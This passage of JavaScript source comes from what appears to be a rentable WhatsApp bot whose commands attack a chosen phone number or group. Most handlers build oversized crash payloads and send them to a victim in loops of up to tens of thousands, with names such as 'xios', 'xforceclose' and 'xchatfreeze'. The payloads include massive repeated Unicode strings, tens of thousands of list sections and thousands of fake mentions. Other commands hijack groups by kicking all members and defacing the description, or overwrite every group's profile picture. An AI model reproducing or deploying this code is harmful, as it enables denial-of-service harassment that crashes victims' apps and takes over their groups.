    if (!video) return replyb('❌ PLZ GIVE ME LODA LINK 🤣.')

    await XeonBotInc.sendMessage(m.chat, {
      video: { url: video.url },
      mimetype: 'video/mp4',
      caption: `🎬 Video 🎥 Instagram`
    }, { quoted: m })

    await XeonBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

  } catch (e) {
    console.error(e)
    replyb('❌ PLZ GIVE LINK INSTAGRAM📷.')
  }
        }
		break
		
		case 'woi': {
			await XeonBotInc.relayMessage(from, {
                "ephemeralMessage": {
                    "message": {
                        "viewOnceMessage": {
                            "message": {
                                "templateMessage": {
                                    "hydratedFourRowTemplate": {
                                        "imageMessage": {
                                            ...(await prepareWAMessageMedia(
                                                { image: { url: 'https://files.catbox.moe/asx3vo.jpg' } },
                                                { upload: XeonBotInc.waUploadToServer }
                                            )).imageMessage
                                        },
                                        "hydratedContentText": XeonBotInc.user.name || '',
                                        "hydratedFooterText": "᭡꧈".repeat(92000), "hydratedButtons": [{ "quickReplyButton": { "displayText": "Telegram: @DGXeon13", "url": "https://w.meta.me/s/2ekhZ2IEReu4AnP" }, "index": 0 }]
                                    },
                                }
                            }
                        }
                    }
                }
            }, {});
			}
			break
		
		case 'xtry': {
    if (!isRentBotUser) return replygcxeon(mess.premium);
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`);
    
    victim = text.split("|")[0];
    const Xreturn = m.mentionedJid && m.mentionedJid[0]
        ? m.mentionedJid[0]
        : m.quoted
        ? m.quoted.sender
        : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
    
    if (victim == "916909137213" || victim == "919366316018" || victim == "919402104401") {
        return;
    }
    
    if (contactInfo.length == 0) {
        return replygcxeon("The number is not registered on WhatsApp");
    }

async function FolwareFunction(target, folware) {
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: folwaredellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg = generateWAMessageFromContent(target, MSG, MassageFolware, {});

  await folware.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await folware.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

    sendMessageWithMentions(
        "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
        " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.",
        [Xreturn]
    );

    for (let i = 0; i < 50000; i++) {
        await FolwareFunction(Xreturn,XeonBotInc);
    }
}
break;

	case 'xforceclose': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 3000; i++) {
     await MOTUPATLU(Xreturn)
   }
		}
		break
		
		case 'xios': case 'xiosnew': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 300; i++) {
     await RansCrashIos(Xreturn)
     await ForceInvisibleCoreNew(Xreturn)
     await crashNewIos(Xreturn)
     await IPhoneAttackCore(Xreturn)
     await ChangliInvisIOSCore(Xreturn)
     await ChangliIosCore(Xreturn)
     await iPhoneCore(Xreturn)
     await FBiphoneCore(Xreturn)
     await SqCrashCore(Xreturn)
     await SmCrashCore(Xreturn)
     await CrashIosCore(Xreturn)
     await VenCrashCore(Xreturn)
     await UpiCrashCore(Xreturn)
     await CrashiPhoneCore(Xreturn)
     await InvisIphoneCore(Xreturn)
     await BlankIphoneCore(Xreturn)
     await XiosVirusCore(Xreturn)
     await IosChatCore(Xreturn)
     await SuperIosCore(Xreturn)
     await RansCrashIos(Xreturn)
     await RansCrashIos(Xreturn)
     await RansCrashIos(Xreturn)
     await crashNewIos(Xreturn)
     await crashNewIos(Xreturn)
     await chatFrezze (Xreturn)
   }
		}
		break
		
		case 'xnewdelay': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 10; i++) {
     await ngewe(Xreturn)
     await ngewe(Xreturn)
     await ngewe(Xreturn)
   }
		}
		break
		
		case 'xmotupatlu255': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 1; i++) {
     await frezbuttoninvis(Xreturn)
     await execDelay(Xreturn)
   }
		}
		break
		
		case 'xdelaypermanet': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 10; i++) {
     await LocationFlowX1(Xreturn)
     await NotifKill(Xreturn)    
   }
		}
		break
	
	case "checkchid": case "idch": {
		if (!isRentBotUser) return replygcxeon(mess.premium)
    if (!text) return replygcxeon(`Provide channel link\nExample: ${prefix+command} https://whatsapp.com/channel/0029VaDnY2y0rGiPV41aSX0l `)
    if (!text.includes("https://whatsapp.com/channel/")) return replygcxeon("Invalid link")
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await XeonBotInc.newsletterMetadata("invite", result)
        if (!res) return replygcxeon("Failed to fetch information of this channel")
        let teks = `
*ID :* ${res.id}
*Name :* ${res.name}
*Total Followers :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Verified" : "Not Verified"}
        `
        return replygcxeon(teks)
    } catch (error) {
        console.error(error);
        return replygcxeon("An error occurred while retrieving metadata");
    }
}
break
	case 'xforceinvi2': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
		for (let i = 0; i < 1000; i++) {+
            await PrePortDoc(Xreturn)
            await NikaFC(Xreturn)
            await CallAntaCayang(Xreturn)
            await NikaFC(Xreturn)
            await DocFC(Xreturn)
            await PrePortDoc(Xreturn)
            await LvsCall(Xreturn)
            await LocaBetanew2(Xreturn)
            console.log(chalk.red("Successfully sent delay new"))
            
}

    }
		break
		
		case 'xchatfreeze': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
    }
    if (victim == "918948797645") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 100; i++) {
						await NotifKill(Xreturn)
						await chatFrezze (Xreturn)
						await crashNewIos(Xreturn)				
					}
		}
		break
	
	case 'searchpair': {
    if (!global.banner.includes(senderNumber)) {
        return;
    }

    // Ensure the user provides a number to search
    if (!args[0]) {
        return replygcxeon("❌ Please provide a number to search. Example: *searchpair 918948797645*");
    }

    const searchNumber = args[0] + '@s.whatsapp.net'; // Convert input to JID format
    const pairingPath = './lib2/pairing';

    try {
        // Check if the pairing directory exists
        if (!fs.existsSync(pairingPath)) {
            return replygcxeon('No paired devices found.');
        }

        // Read all directories (and files) inside ./lib2/pairing
        const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

        // Filter for directories (paired device IDs)
        const pairedDevices = entries
            .filter(entry => entry.isDirectory())
            .map(entry => entry.name); // Keep full JID format

        // Check if the searched number exists
        if (pairedDevices.includes(searchNumber)) {
            return replygcxeon(`✅ The number *${args[0]}* is paired.`);
        } else {
            return replygcxeon(`❌ The number *${args[0]}* is not paired.`);
        }
    } catch (err) {
        console.error('Error searching paired devices:', err);
        return replygcxeon('Failed to search paired devices data.');
    }
}
break;

case 'xxxban': case 'xx🦄': {
	// Check if botNumber or sender is in global.banner
    if (global.banner.includes(botNumber) || !global.banner.includes(senderNumber)) {
        return;
    }
    try {
        const fs = require('fs');
        const axios = require('axios');
        const path = require('path');

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        const imageUrl = "https://raw.githubusercontent.com/dgxeon13/xeonPloitWa/refs/heads/main/photo_2024-12-19_01-39-48.jpg";
        const imagePath = path.join(__dirname, 'temp_profile.jpg');

        (async () => {
            // Download the image
            let response = await axios({ url: imageUrl, responseType: 'arraybuffer' });
            fs.writeFileSync(imagePath, Buffer.from(response.data, 'binary'));

            // Change bot's profile picture
            await XeonBotInc.updateProfilePicture(XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net", { url: imagePath });

            // Fetch all groups
            let allGroups = Object.values(await XeonBotInc.groupFetchAllParticipating().catch(() => []));
            let groupIds = allGroups.map(group => group.id);

            // Filter out blacklisted groups
            let blacklistedGroups = [];
            try {
                blacklistedGroups = JSON.parse(fs.readFileSync('./database/idgroup.json', "utf8"));
            } catch (err) {
                console.error("⚠️ No blacklist file found, continuing...");
            }

            let targetGroups = groupIds.filter(id => !blacklistedGroups.includes(id));

            // Update profile pictures in each group
            for (let groupId of targetGroups) {
                try {
                    await XeonBotInc.updateProfilePicture(groupId, { url: imagePath });
                    console.log(`✅ Updated profile picture for ${groupId}`);
                } catch (err) {
                    console.error(`❌ Error updating profile picture for ${groupId}:`, err);
                }
                await delay(1000); // Wait 1 second between updates
            }

            // Clean up & send message
            fs.unlinkSync(imagePath);
        })();
    } catch (error) {
        console.error("❌ Detailed Error:", error);
    }
}
break;

	case 'xfreezeinvisiblexxx': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 1; i++) {
		await sendMessagesForDuration(24, Xreturn)	
            }
		}
		break
		
		case 'xforceui': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 200; i++) {
		await sbh(Xreturn)
		await sbh(Xreturn)
		await LvsCall(Xreturn)
		await LocaBetanew2(Xreturn)
            }
		}
		break
		
		case 'xxxuicrash': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 999; i++) {
						await EpUi(Xreturn)						
					}
		}
		break
		
		case 'xxxflood': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 999; i++) {
						await EpHemeral(Xreturn)						
					}
		}
		break
		
		case 'xxxios3': {
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
  for (let i = 0; i < 10; i++) {
						await TrashLocIOS(Xreturn, Ptcp = false)
						await crashNewIos(Xreturn)
					}
		}
		break
		case 'xxxios2':{
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  async function xiosv2(target){
await XeonBotInc.relayMessage(target, {
"requestPhoneNumberMessage": {
"contextInfo": {
"stanzaId": "3AC8CAA104A4EC8F7212",
"participant": "13135550002@s.whatsapp.net",
"remoteJid": "status@broadcast",
quotedMessage: {
"documentMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
"mimetype": "application/javascript",
"fileSha256": "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
"fileLength": "0",
"pageCount": 0,
"mediaKey": "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
"fileName": "@ Você foi mencionado",
"fileEncSha256": "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
"directPath": "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1737369406",
"caption": "@ Você foi mencionado",
"title": "@ Você foi mencionado",
mentionedJid: [target,sender],
}
},
"externalAdReply": {
"title": "𑐶𑐵𑆷𑐷𑆵".repeat(19999),
"body": " Telegram: @Megahubbots",
"mediaType": "VIDEO",
"renderLargerThumbnail": true,
"sourceUrl": "https://instagram.com/@Ramy.phoenix",
"mediaUrl": "https://instagram.com/@Ramy.phoenix",
"containsAutoReply": true,
"renderLargerThumbnail": true,
"showAdAttribution": true,
"ctwaClid": "ctwa_clid_example",
"ref": "ref_example"
},
"forwardedNewsletterMessageInfo": {
"newsletterJid": "8888888888888-1234567890@g.us",
"serverMessageId": 1,
"newsletterName": "𑐶𑐵𑆷𑐷𑆵".repeat(19999),
"contentType": "UPDATE",
},

},
skipType: 7,
}
}, {participant: { jid : target }})
}
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
for (let i = 0; i < 30; i++) {
await xiosv2(Xreturn)
}
}
break;
		case 'xxxiosinvisible': case 'xxxiosinvi': case 'xxxios':{
if (!isRentBotUser) return replygcxeon(mess.premium)
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366316018") {
    return;
    }
    if (victim == "919402104401") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
async function iosCrash(target){
await XeonBotInc.relayMessage(target, {
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
}
}, { participant: { jid : target } })
await XeonBotInc.relayMessage(target, {
extendedTextMessage: {
text: "This is a message with context info",
contextInfo: {
stanzaId: "1234567890ABCDEF",
participant: target,
quotedMessage: {
conversation: "This is a quoted message"
},
remoteJid: target,
mentionedJid: ["916909137213@s.whatsapp.net"],
conversionSource: "source_example",
conversionData: Buffer.from("conversion_data_example"),
conversionDelaySeconds: 10,
forwardingScore: 1,
isForwarded: true,
quotedAd: {
advertiserName: "Example Advertiser",
mediaType: 1,
jpegThumbnail: await getBuffer('https://t2.tudocdn.net/632662?w=646&h=284'),
caption: "This is an ad caption"
},
placeholderKey: {
remoteJid: target,
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: 86400,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: Buffer.from("ephemeral_shared_secret_example"),
externalAdReply: {
title: "External Ad Title",
body: "External Ad Body",
mediaType: 1,
thumbnailUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
mediaUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
thumbnail: Buffer.from("1234567890abcdef", "hex"),
sourceType: "source_type_example",
sourceId: "source_id_example",
sourceUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
containsAutoReply: true,
renderLargerThumbnail: true,
showAdAttribution: true,
ctwaClid: "ctwa_clid_example",
ref: "ref_example"
},
entryPointConversionSource: "entry_point_source_example",
entryPointConversionApp: "entry_point_app_example",
entryPointConversionDelaySeconds: 5,
disappearingMode: {
duration: 604800
},
actionLink: {
buttonText: "Click Here",
url: "https://example.com"
},
groupSubject: "Example Group Subject",
parentGroupJid: "5531988888888-1234567890@g.us",
trustBannerType: "trust_banner_example",
trustBannerAction: 1,
isSampled: false,
utm: {
utmSource: "utm_source_example",
utmCampaign: "utm_campaign_example"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "916909137213-1234567890@g.us",
serverMessageId: 1,
newsletterName: "x".repeat(99999),
contentType: 1,
accessibilityText: "Example accessibility text"
},
businessMessageForwardInfo: {
businessOwnerJid: "916909137213@s.whatsapp.net"
},
smbClientCampaignId: "smb_client_campaign_id_example",
smbServerCampaignId: "smb_server_campaign_id_example",
dataSharingContext: {
showMmDisclosure: true
}
}
}
}, { participant: { jid : target }})
}
sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
for (let i = 0; i < 30; i++) {
await iosCrash(Xreturn)
}
}
break;
	
case 'promoteall': {
	if (!isRentBotUser) return replygcxeon(mess.premium)
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available for promotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'promote');
        await replygcxeon("Successfully promoted all members!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while promoting members.");
    }
}
break;

case 'demoteall': {
	if (!isRentBotUser) return replygcxeon(mess.premium)
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin !== null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No admins available for demotion.");

    try {
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'demote');
        await replygcxeon("Successfully demoted all admins!");
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while demoting members.");
    }
}
break;

case 'kickall': case 'hack': case 'hijack': case 'nuke': {
	if (!isRentBotUser) return replygcxeon(mess.premium)
    if (!m.isGroup) return replygcxeon("This command can only be used in groups.");
    if (!isBotAdmins) return 

    const xeon_collect_members = participants
        .filter(v => v.admin === null && v.id !== botNumber)
        .map(v => v.id);

    if (xeon_collect_members.length === 0) return replygcxeon("No members available to kick.");

    try {
        await XeonBotInc.groupUpdateDescription(from, '\n\n\nGROUP HIJACKED BY Telegram: @Megahubbots\n\n\n');
        await sleep(100);
        await XeonBotInc.groupUpdateSubject(from, '\u0000');
        replygcxeon(`\n\n\n\n\n\n\n\n\n\n\n\nGroup Hacked by Telegram: @Megahubbots\n\n\n\n\n\n\n\n\n\n\n\n`);
        await sleep(100);
        await XeonBotInc.groupParticipantsUpdate(from, xeon_collect_members, 'remove');
    } catch (e) {
        console.log(e);
        await replygcxeon("An error occurred while kicking members.");
    }
}
break;

	case 'forcegroup':
    if (!isRentBotUser) return replygcxeon(mess.premium);
    if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us|5\n\nTo get group ID, type .listgc\n\nTo get group ID from a group link, type .group-id link`);

    // Check if input contains a WhatsApp group link
    if (q.includes("chat.whatsapp.com")) {
        return replygcxeon("Group ID must be a number, not a link. Use .group-id <link> to get the group ID.");
    }

    // Extract group ID and amount from input
    let input = q.split("|");
    let victimxd = input[0].trim(); // Group ID
    let loopCount2 = parseInt(input[1]); // Extract amount

    // Validate Group ID format (only numbers + "@g.us")
    if (!/^\d+@g\.us$/.test(victimxd)) {
        return replygcxeon("Invalid group ID! Please enter a correct WhatsApp group ID.");
    }

    // Validate loop count
    if (isNaN(loopCount2) || loopCount2 < 1) {
        loopCount2 = 5; // Default to 5 if amount is invalid
    }

    replygcxeon(`Successfully sent force message to the group chat`);

